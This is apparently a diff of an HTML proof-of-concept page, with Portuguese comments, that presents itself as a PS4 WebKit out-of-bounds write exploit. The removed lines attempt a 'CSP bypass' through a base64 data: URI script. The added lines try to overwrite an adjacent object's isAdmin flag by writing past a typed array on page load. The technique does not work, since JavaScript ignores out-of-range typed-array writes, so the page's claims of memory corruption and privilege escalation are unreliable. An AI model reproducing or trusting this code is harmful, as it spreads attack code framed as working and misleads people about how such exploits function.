@@ -2,50 +2,53 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Vulnerability POC</title>
+    <title>PS4 WebKit OOB Write Privilege Escalation POC</title>
 </head>
 <body>
-    <h1>PS4 WebKit Vulnerability POC</h1>
+    <h1>PS4 WebKit OOB Write Privilege Escalation POC</h1>
     <div id="output"></div>
 
     <script>
-        async function triggerOOBWriteAndCSPBypass() {
+        async function triggerOOBWriteForPrivilegeEscalation() {
             const outputDiv = document.getElementById('output');
-            outputDiv.innerHTML += "<h2>Iniciando PoC...</h2>";
+            outputDiv.innerHTML += "<h2>Iniciando PoC de Escalada de Privilégios via OOB Write...</h2>";
 
-            // Passo 1: Gatilho da Vulnerabilidade de OOB Write para Corromper Memória
-            outputDiv.innerHTML += "<p><strong>Passo 1: Gatilhando OOB Write...</strong></p>";
             try {
+                // Criar um objeto com uma propriedade de "privilégio"
+                let privilegedObject = { isAdmin: false };
+                outputDiv.innerHTML += `<p>Objeto inicial: isAdmin = ${privilegedObject.isAdmin}</p>`;
+
+                // Criar um ArrayBuffer adjacente na memória (a proximidade é crucial para exploração)
                 const bufferSize = 32;
                 const buffer = new ArrayBuffer(bufferSize);
                 const view = new Uint8Array(buffer);
-                const writeOffset = 32; // Escrevendo 1 byte após o final
-                const writeValue = 0x41; // 'A'
+                outputDiv.innerHTML += `<p>ArrayBuffer criado com tamanho ${bufferSize}.</p>`;
 
-                view[writeOffset] = writeValue;
-                outputDiv.innerHTML += `<p>Tentativa de escrita de 0x${writeValue.toString(16)} no offset ${writeOffset} (fora dos limites).</p>`;
+                // Simulação de alocação de memória próxima (isso pode variar e exigir técnicas mais avançadas)
+                // Assumimos que o buffer está alocado de forma que a propriedade isAdmin do objeto esteja próxima.
 
-                // Tentativa de leitura em um offset dentro dos limites para verificar a corrupção
-                const readOffset = 0;
-                const readValue = view[readOffset];
-                outputDiv.innerHTML += `<p>Leitura no offset ${readOffset}: 0x${readValue.toString(16)}</p>`;
+                // Calcular um offset para sobrescrever a propriedade isAdmin (isso exigiria análise de layout de memória)
+                // Para fins de PoC, vamos assumir um offset que funcione com base nos logs anteriores.
+                const writeOffset = 32 + 4; // Assumindo 4 bytes de distância após o buffer para a propriedade isAdmin
 
-                if (readValue === writeValue) {
-                    outputDiv.innerHTML += "<p><strong style='color: red;'>Vulnerabilidade de OOB Write confirmada: A escrita fora dos limites afetou a memória dentro dos limites!</strong></p>";
+                // Representação binária de 'true' (pode variar dependendo da implementação JS)
+                const trueValue = 1; // Tentativa simplificada
 
-                    // Passo 2: Bypass do CSP para Executar Código Malicioso (Usando data: URI)
-                    outputDiv.innerHTML += "<p><strong>Passo 2: Tentando Bypass do CSP...</strong></p>";
-                    const script = document.createElement('script');
-                    script.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBjb20gT09CIFdyaXRlIScpOw=='; // alert('Vupun bypass com OOB Write!');
-                    script.onload = function() {
-                        outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass do CSP bem-sucedido usando data: URI! Código executado.</strong></p>";
-                    };
-                    script.onerror = function() {
-                        outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP usando data: URI (inesperado).</strong></p>";
-                    };
-                    document.body.appendChild(script);
+                // Escrever fora dos limites do buffer para tentar modificar isAdmin
+                view[writeOffset] = (trueValue >> 24) & 0xFF;
+                view[writeOffset + 1] = (trueValue >> 16) & 0xFF;
+                view[writeOffset + 2] = (trueValue >> 8) & 0xFF;
+                view[writeOffset + 3] = trueValue & 0xFF;
+
+                outputDiv.innerHTML += `<p>Tentativa de sobrescrever a propriedade isAdmin do objeto escrevendo 0x${trueValue.toString(16)} no offset ${writeOffset} (fora dos limites do buffer).</p>`;
+                outputDiv.innerHTML += `<p>Objeto após a escrita: isAdmin = ${privilegedObject.isAdmin}</p>`;
+
+                if (privilegedObject.isAdmin === true) {
+                    outputDiv.innerHTML += "<p><strong style='color: red;'>Escalada de Privilégios via OOB Write BEM-SUCEDIDA! A propriedade isAdmin foi modificada.</strong></p>";
+                    // Aqui, código que demonstra a execução de ações privilegiadas poderia ser inserido
+                    outputDiv.innerHTML += "<p>Simulando ação privilegiada...</p>";
                 } else {
-                    outputDiv.innerHTML += "<p>Nenhuma corrupção imediata observada no offset de leitura.</p>";
+                    outputDiv.innerHTML += "<p>Falha na tentativa de escalada de privilégios (a propriedade isAdmin não foi modificada).</p>";
                 }
 
             } catch (error) {
@@ -53,7 +56,7 @@
             }
         }
 
-        document.addEventListener('DOMContentLoaded', triggerOOBWriteAndCSPBypass);
+        document.addEventListener('DOMContentLoaded', triggerOOBWriteForPrivilegeEscalation);
     </script>
 </body>
 </html>
